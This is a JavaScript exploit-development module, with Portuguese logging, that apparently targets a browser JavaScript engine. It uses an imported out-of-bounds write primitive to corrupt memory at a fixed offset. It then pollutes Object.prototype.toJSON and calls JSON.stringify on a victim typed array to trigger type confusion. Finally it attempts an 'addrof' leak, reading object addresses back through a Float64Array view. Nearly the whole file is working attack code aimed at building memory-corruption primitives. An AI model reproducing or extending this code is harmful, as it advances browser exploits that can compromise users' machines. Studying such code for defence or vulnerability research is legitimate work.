// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v7_IsolateVictimInteraction)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V7_IVI = "OriginalHeisenbug_TypedArrayAddrof_v7_IsolateVictimInteraction";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;

let last_probe_call_details_v7 = null; 
let object_to_leak_A_v7 = null;
let object_to_leak_B_v7 = null;
let victim_typed_array_ref_v7 = null; // Renomeado para v7

function toJSON_TA_Probe_IsolateVictimInteraction() {
    let current_call_details = {
        probe_variant: "TA_Probe_Addrof_v7_IsolateVictimInteraction",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        probe_called: true,
        this_was_victim_ref_when_confused: null, 
        writes_to_original_victim_attempted: false // Nova flag
    };

    try {
        current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
        
        logS3(`[${current_call_details.probe_variant}] Sonda INVOCADA. 'this' type: ${current_call_details.this_type_in_toJSON}. 'this' === victim_typed_array_ref_v7? ${this === victim_typed_array_ref_v7}`, "leak");

        if (current_call_details.this_type_in_toJSON === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] TYPE CONFUSION DETECTED for 'this' (now [object Object])!`, "vuln");
            
            current_call_details.this_was_victim_ref_when_confused = (this === victim_typed_array_ref_v7);
            logS3(`[${current_call_details.probe_variant}] At confusion, 'this' === victim_typed_array_ref_v7? ${current_call_details.this_was_victim_ref_when_confused}`, "info");

            // NOVA TÉCNICA: Tentar escrever na *referência original da vítima* enquanto 'this' está confuso
            logS3(`[${current_call_details.probe_variant}] 'this' está confuso. Tentando escritas diretas em victim_typed_array_ref_v7...`, "warn");
            try {
                if (object_to_leak_A_v7) {
                    victim_typed_array_ref_v7[0] = object_to_leak_A_v7;
                    logS3(`[${current_call_details.probe_variant}] Escrita de object_to_leak_A_v7 em victim_typed_array_ref_v7[0] tentada.`, "info");
                }
                if (object_to_leak_B_v7) {
                    victim_typed_array_ref_v7[1] = object_to_leak_B_v7;
                    logS3(`[${current_call_details.probe_variant}] Escrita de object_to_leak_B_v7 em victim_typed_array_ref_v7[1] tentada.`, "info");
                }
                current_call_details.writes_to_original_victim_attempted = true;
            } catch (e_victim_write) {
                logS3(`[${current_call_details.probe_variant}] ERRO ao escrever em victim_typed_array_ref_v7 durante confusão de 'this': ${e_victim_write.message}`, "error");
                current_call_details.error_in_toJSON = (current_call_details.error_in_toJSON || "") + ` WriteToVictimError: ${e_victim_write.message}`;
            }

        } else if (this === victim_typed_array_ref_v7) {
            logS3(`[${current_call_details.probe_variant}] 'this' é victim_typed_array_ref_v7, type é ${current_call_details.this_type_in_toJSON}. Sem confusão ainda para este 'this'.`, "info");
        } else {
            logS3(`[${current_call_details.probe_variant}] 'this' (type: ${current_call_details.this_type_in_toJSON}) não é victim_typed_array_ref_v7. Sem ação.`, "warn");
        }

    } catch (e) {
        current_call_details.error_in_toJSON = (current_call_details.error_in_toJSON || "") + ` ProbeError: ${e.name} - ${e.message}`;
        logS3(`[${current_call_details.probe_variant}] ERRO na sonda: ${e.name} - ${e.message}`, "error");
    }
    
    last_probe_call_details_v7 = { ...current_call_details }; 

    return { minimal_probe_v7_ivi_did_execute: true }; 
}

export async function executeTypedArrayVictimAddrofTest_IsolateVictimInteraction() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V7_IVI}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, IsolateVictimInteraction) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V7_IVI} Inic...`;

    last_probe_call_details_v7 = null;
    victim_typed_array_ref_v7 = null; // Corrigido para v7
    object_to_leak_A_v7 = { marker: "ObjA_TA_v7ivi", id: Date.now() }; 
    object_to_leak_B_v7 = { marker: "ObjB_TA_v7ivi", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    let captured_probe_details_after_stringify = null;
    
    let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A @ view[0]: Não tentado ou Heisenbug/escrita falhou." };
    let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B @ view[1]: Não tentado ou Heisenbug/escrita falhou." };
    
    const fillPattern = 0.12121212121212;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!oob_array_buffer_real && typeof oob_write_absolute !== 'function') {
            throw new Error("OOB Init falhou ou oob_write_absolute não está disponível.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`   Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}`, "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE)} em oob_array_buffer_real[${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} realizada.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(100);

        victim_typed_array_ref_v7 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); // Corrigido para v7
        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v7.buffer); // Corrigido para v7
        
        for(let i = 0; i < float64_view_on_underlying_ab.length; i++) {
            float64_view_on_underlying_ab[i] = fillPattern + i;
        }

        logS3(`PASSO 2: victim_typed_array_ref_v7 (Uint8Array) criado. View preenchida com ${float64_view_on_underlying_ab[0]}.`, "test", FNAME_CURRENT_TEST);
        logS3(`   Tentando JSON.stringify em victim_typed_array_ref_v7 com ${toJSON_TA_Probe_IsolateVictimInteraction.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_TA_Probe_IsolateVictimInteraction,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_TA_Probe_IsolateVictimInteraction.name}.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_typed_array_ref_v7)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v7); 
            
            logS3(`  JSON.stringify(victim_typed_array_ref_v7) completou. Stringify Output: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            
            if (last_probe_call_details_v7) {
                captured_probe_details_after_stringify = { ...last_probe_call_details_v7 }; 
            }
            logS3(`  Detalhes da ÚLTIMA chamada da sonda (capturados): ${captured_probe_details_after_stringify ? JSON.stringify(captured_probe_details_after_stringify) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugObservedOnThisInProbe = false;
            if (captured_probe_details_after_stringify && 
                captured_probe_details_after_stringify.probe_called &&
                captured_probe_details_after_stringify.this_type_in_toJSON === "[object Object]") {
                heisenbugObservedOnThisInProbe = true;
                logS3(`  HEISENBUG NO 'this' DA SONDA CONFIRMADA! 'this' type: ${captured_probe_details_after_stringify.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
                logS3(`    Na sonda confusa, 'this' === victim_typed_array_ref_v7? ${captured_probe_details_after_stringify.this_was_victim_ref_when_confused}`, "info");
                logS3(`    Na sonda confusa, escritas na VÍTIMA ORIGINAL tentadas? ${captured_probe_details_after_stringify.writes_to_original_victim_attempted}`, "info");
            } else {
                let msg = "Heisenbug no 'this' da sonda NÃO confirmada via detalhes capturados.";
                if(captured_probe_details_after_stringify && captured_probe_details_after_stringify.this_type_in_toJSON) {
                    msg += ` 'this' type na última sonda: ${captured_probe_details_after_stringify.this_type_in_toJSON}.`;
                } else if (!captured_probe_details_after_stringify) {
                    msg += " Detalhes da última sonda não capturados.";
                }
                logS3(`  ALERTA: ${msg}`, "error", FNAME_CURRENT_TEST);
            }
                
            logS3("PASSO 3: Verificando float64_view_on_underlying_ab...", "warn", FNAME_CURRENT_TEST);

            const val_A_double = float64_view_on_underlying_ab[0];
            addrof_result_A.leaked_address_as_double = val_A_double;
            let temp_buf_A = new ArrayBuffer(8); new Float64Array(temp_buf_A)[0] = val_A_double;
            addrof_result_A.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_A)[0], new Uint32Array(temp_buf_A)[1]);
            logS3(`  Valor lido de float64_view_on_underlying_ab[0] (para ObjA): ${val_A_double} (${addrof_result_A.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);

            if (val_A_double !== (fillPattern + 0) && val_A_double !== 0 &&
                (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                logS3("  !!!! VALOR LIDO em view[0] PARECE UM PONTEIRO POTENCIAL (ObjA) !!!!", "vuln", FNAME_CURRENT_TEST);
                addrof_result_A.success = true;
                addrof_result_A.message = "Heisenbug (IsolateVictimInteraction) observada & view[0] sugere ponteiro para ObjA.";
            } else {
                addrof_result_A.message = "View[0] não parece ponteiro para ObjA ou buffer não foi alterado.";
                if (heisenbugObservedOnThisInProbe) addrof_result_A.message = "Heisenbug no 'this' da sonda observada, mas " + addrof_result_A.message;
                if (val_A_double === (fillPattern + 0)) addrof_result_A.message += " (Valor é igual ao fillPattern inicial)";
            }

            const val_B_double = float64_view_on_underlying_ab[1];
            addrof_result_B.leaked_address_as_double = val_B_double;
            let temp_buf_B = new ArrayBuffer(8); new Float64Array(temp_buf_B)[0] = val_B_double;
            addrof_result_B.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_B)[0], new Uint32Array(temp_buf_B)[1]);
            logS3(`  Valor lido de float64_view_on_underlying_ab[1] (para ObjB): ${val_B_double} (${addrof_result_B.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);
            
            if (val_B_double !== (fillPattern + 1) && val_B_double !== 0 &&
                (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                logS3("  !!!! VALOR LIDO em view[1] PARECE UM PONTEIRO POTENCIAL (ObjB) !!!!", "vuln", FNAME_CURRENT_TEST);
                addrof_result_B.success = true;
                addrof_result_B.message = "Heisenbug (IsolateVictimInteraction) observada & view[1] sugere ponteiro para ObjB.";
            } else {
                addrof_result_B.message = "View[1] não parece ponteiro para ObjB ou buffer não foi alterado.";
                 if (heisenbugObservedOnThisInProbe) addrof_result_B.message = "Heisenbug no 'this' da sonda observada, mas " + addrof_result_B.message;
                if (val_B_double === (fillPattern + 1)) addrof_result_B.message += " (Valor é igual ao fillPattern inicial)";
            }

            if (addrof_result_A.success || addrof_result_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V7_IVI}: Addr? SUCESSO!`;
            } else if (heisenbugObservedOnThisInProbe) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V7_IVI}: Heisenbug Sonda OK, Addr Falhou`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V7_IVI}: Heisenbug Sonda Falhou?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V7_IVI}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.${ppKey} restaurado.`, "info", FNAME_CURRENT_TEST);
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V7_IVI} FALHOU CRITICAMENTE`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof A (view[0]): Success=${addrof_result_A.success}, Msg='${addrof_result_A.message}'`, addrof_result_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result_A.leaked_address_as_int64){
            logS3(`  Addrof A (Int64): ${addrof_result_A.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        logS3(`Resultado Addrof B (view[1]): Success=${addrof_result_B.success}, Msg='${addrof_result_B.message}'`, addrof_result_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result_B.leaked_address_as_int64){
            logS3(`  Addrof B (Int64): ${addrof_result_B.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        
        object_to_leak_A_v7 = null;
        object_to_leak_B_v7 = null;
        victim_typed_array_ref_v7 = null; // Corrigido para v7
        last_probe_call_details_v7 = null; 
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput, 
        toJSON_details: captured_probe_details_after_stringify, 
        addrof_A_attempt_result: addrof_result_A,
        addrof_B_attempt_result: addrof_result_B
    };
}
